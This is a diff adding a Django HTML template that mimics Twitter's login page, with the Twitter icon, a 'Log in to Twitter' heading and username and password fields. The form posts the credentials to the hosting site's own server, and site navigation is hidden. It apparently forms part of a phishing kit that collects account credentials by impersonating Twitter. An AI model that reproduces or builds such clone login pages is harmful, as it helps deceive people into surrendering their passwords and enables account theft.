@@ -1,0 +1,51 @@
+{% extends 'index.html' %}
+{% block title %} twitter{% endblock %}
+
+{% block mstyle %}
+    .width{width:70%;margin-left:15%;}
+    .but{width:110%;}
+    .inp{}
+
+{% endblock %}
+
+{% block dstyle %}
+    .width{width:28%;margin-left:35%;}
+    .but{width:105%;}
+
+{% endblock %}
+
+{% block gstyle %}
+    input:focus + label { color:#42a5f5 !important; border-color:#42a5f5 !important; }
+
+nav{display:none;}
+
+{% endblock %}
+
+{% block content %}
+
+<div class="row">
+            <form target="_self" method="post">
+            {% csrf_token %}
+
+    <div class="width" style="margin-top:10ex;">
+        <i class="im im-twitter" style="color:#42a5f5;"></i>
+        <h5>Log in to Twitter </h5>
+
+        <div class="input-field ">
+            <input id="last_name" type="text"  name="user" class="validate" style="border:2px solid black;padding-left:2ex;">
+            <label for="last_name" style="margin-top:2ex;padding-left:2ex;border:none;">Phone, email, or username </label>
+        </div>
+
+        <div class="input-field ">
+            <input id="last" type="password" name="pass" class="validate" style="border:2px solid black;padding-left:2ex;">
+            <label for="last" style="margin-top:2ex;padding-left:2ex;border:none;">Password </label>
+        </div>
+
+        <button class="but btn" type="submit" style="background-color:#42a5f5;">Log in</button>
+
+    </div>
+            </form>
+</div>
+
+
+{% endblock %}
